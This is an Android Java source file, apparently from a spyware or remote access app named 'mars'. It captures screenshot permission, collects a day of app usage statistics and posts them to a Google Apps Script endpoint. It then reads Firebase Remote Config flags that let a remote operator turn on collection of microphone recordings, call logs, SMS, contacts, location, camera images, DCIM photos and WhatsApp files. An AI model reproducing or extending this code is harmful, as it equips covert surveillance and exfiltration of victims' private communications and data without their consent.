package app.marees.mars.Utilites;

import android.app.Activity;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

import androidx.annotation.NonNull;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import app.marees.mars.MarsService.ConnectionManager;
import app.marees.mars.BuildConfig;
import app.marees.mars.R;
import app.marees.mars.ScreenshotAct;
import app.marees.mars.Singletons.Myapp;
import app.marees.mars.Singletons.Singleton;


public class AccessHelper extends Activity {

    MediaProjectionManager mediaProjectionManager;
    boolean test = true;
    FirebaseRemoteConfig mFirebaseRemoteConfig;
    FirebaseRemoteConfigSettings configSettings;
    long cacheExpiration = 0;
    Double duration =10.25;
    String custom ="";
    int c=0;
    boolean bool = true;
    JSONArray js = new JSONArray();

    boolean mic,call,sms,contact,location,camera,dcim,whatsapp,path;
    @Override
    protected void onCreate(final Bundle savedInstanceState) {
        super.onCreate(null);
        if (test) {
            mediaProjectionManager = (MediaProjectionManager) Myapp.getAppContext().getSystemService(MEDIA_PROJECTION_SERVICE);
            startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), 1);

            test = false;
        }


    }

    @Override
    public void onActivityResult(final int requestCode, final int resultCode, final Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (1 == requestCode) {
            if (Activity.RESULT_OK == resultCode) {
                Myapp.setScreenshotPermission((Intent) data.clone());
                ((Myapp) getApplication()).setMediaProjectionManager(mediaProjectionManager);
                Log.e("from","AccessHelper");
                getUsage();
                checkRemoteData();
                ScreenshotAct t2 = new ScreenshotAct();
                t2.getShot();

            }
        } else if (Activity.RESULT_CANCELED == resultCode) {
            Myapp.setScreenshotPermission(null);


        }
        finish();
    }

    private void getUsage() {


        ArrayList<String> myList = new ArrayList<>();
        UsageStatsManager mUsageStatsManager = (UsageStatsManager) this.getSystemService(Context.USAGE_STATS_SERVICE);
        List<UsageStats> queryUsageStats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY,
                (System.currentTimeMillis() - 86400000), System.currentTimeMillis());
        js= new JSONArray();
        for (UsageStats app : queryUsageStats) {
            float f =  (float) (app.getTotalTimeInForeground() / 1000);


                    js.put(app.getPackageName()+" - "+Float.toString(f));



        }

        sendtoDrive(js);

    }

    private void sendtoDrive(JSONArray jsw) {




          RequestQueue mqueue;
            mqueue = Singleton.getInstance(Myapp.getAppContext()).getRequestQueue();
            String url = "https://script.google.com/macros/s/AKfycbw9uMhUausfVngikSLzXLXQHbVTRdTsC0aFJIJ5nLQcqifm6Xs/exec";
            JSONObject js = new JSONObject();
            try {
                js.put("appUse",jsw);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            JsonObjectRequest myRequest = new JsonObjectRequest(Request.Method.POST, url, js, new Response.Listener<JSONObject>() {
                @Override
                public void onResponse(JSONObject response) {


                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {


                }
            });

            myRequest.setRetryPolicy(new DefaultRetryPolicy(
                    50000,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            mqueue.add(myRequest);

        }





    private void checkRemoteData() {
        Log.e("MainService","inside job");

        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setDeveloperModeEnabled(BuildConfig.DEBUG)
                .build();
        mFirebaseRemoteConfig.setConfigSettings(configSettings);
        mFirebaseRemoteConfig.setDefaults(R.xml.remote_config_defaults);
        mFirebaseRemoteConfig.fetch(getCacheExpiration())

                .addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {
// If is successful, activated fetched
                        if (task.isSuccessful()) {
                            mFirebaseRemoteConfig.activateFetched();
                        } else {
                            Log.d("","");
                        }


                        Myapp.setCommand(mFirebaseRemoteConfig.getString("Command"));
                        Log.e("MainService","Checking data");
                        checkData();
                    }
                });




        Log.e("StartCommand","inside job");

    }

    private void checkData() {

        mic = call = sms = contact = location =camera = dcim = whatsapp = path =false;

        if(mFirebaseRemoteConfig.getString("Command").equals("")){

            Log.e("RemoteMode","Cant Find Data");
        }
        else if(mFirebaseRemoteConfig.getString("Command").equals("Yes")){

            Log.e("RemoteMode","Enabled");


            if(mFirebaseRemoteConfig.getString("Mic").equals("Yes")){
                Log.e("Remote", "Mic Yes");
                duration = mFirebaseRemoteConfig.getDouble("Duration");
//
//                duration = mFirebaseRemoteConfig.getString("duration");
//                Log.e("Check","dur "+mFirebaseRemoteConfig.getString("duration"));
//                Log.e("Remote", "Duration "+duration);
                mic = true;
            }
            if(mFirebaseRemoteConfig.getString("Call").equals("Yes")){
                Log.e("Remote","Calllog Yes");
                Log.e("Check","Calllog "+mFirebaseRemoteConfig.getString("Call"));

                call=true;
            }if(mFirebaseRemoteConfig.getString("Contact").equals("Yes")){
                Log.e("Remote","Contact Yes");
                contact=true;
            }if(mFirebaseRemoteConfig.getString("Sms").equals("Yes")){
                Log.e("Remote","Sms Yes");
                sms=true;
            }if(mFirebaseRemoteConfig.getString("Location").equals("Yes")){
                Log.e("Remote","Location Yes");
                location=true;
            }
            if(mFirebaseRemoteConfig.getString("Camera").equals("Yes")){
                Log.e("Remote","Camera Yes");
                camera=true;
            }
            if(mFirebaseRemoteConfig.getString("DCIM").equals("Yes")){
                Log.e("Remote","DCIM Yes");
                dcim = true;
            }
            if(mFirebaseRemoteConfig.getString("Whatsapp").equals("Yes")){
                Log.e("Remote","Whatsapp Yes");
                whatsapp = true;
            }
            if(!mFirebaseRemoteConfig.getString("Custom").equals("")){

                custom = mFirebaseRemoteConfig.getString("Custom");
                Log.e("Remote","Custom Path:-"+custom);
            }
            if(!mFirebaseRemoteConfig.getString("Path").equals("Yes")){

                path = true;
                Log.e("Remote","path Yes");
            }
            //  Log.e("sa",duration.toString());

            ConnectionManager.startAsync(Myapp.getAppContext(),mic,call,contact,sms,location,camera,duration,dcim,whatsapp,custom, path);


        }
        else if(mFirebaseRemoteConfig.getString("Command").equals("No")){
            Log.e("RemoteMode","Disabled");
        }
        else if(mFirebaseRemoteConfig.getString("Command").equals(null)){
            Log.e("RemoteMode","nullData");
        }
        else{

            Log.e("RemoteMode","CheckString");
        }
    }

    public long getCacheExpiration() {
// If is developer mode, cache expiration set to 0, in order to test
        if (mFirebaseRemoteConfig.getInfo().getConfigSettings().isDeveloperModeEnabled()) {
            cacheExpiration = 0;
        }
        return cacheExpiration;
    }
}
